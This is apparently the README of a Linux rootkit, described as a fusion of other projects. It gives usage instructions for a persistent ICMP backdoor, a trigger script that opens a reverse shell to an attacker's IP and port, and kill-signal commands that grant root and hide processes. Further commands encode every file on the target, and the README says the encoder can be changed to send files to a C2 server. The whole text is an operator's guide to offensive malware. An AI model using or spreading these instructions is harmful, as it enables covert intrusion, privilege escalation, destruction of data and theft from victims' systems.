This rootkit is a fusion from different projects I looked at and is used to get: a persistent icmp backdoor, root access, process hiding, file encoder, directory and file hiding.

usage:
get a reverse shell by running borg_locutus/trigger.sh <target ip> <attacker ip> <attacker port>
get root by using kill -64 $RANDOM
hide a process by using kill -63 pid
encode all files on the target with kill -62 $RANDOM 
you can even extend the encoder to send all interesting files to a c2. To do this you need to change: c2_addr, c2_port in enc.py
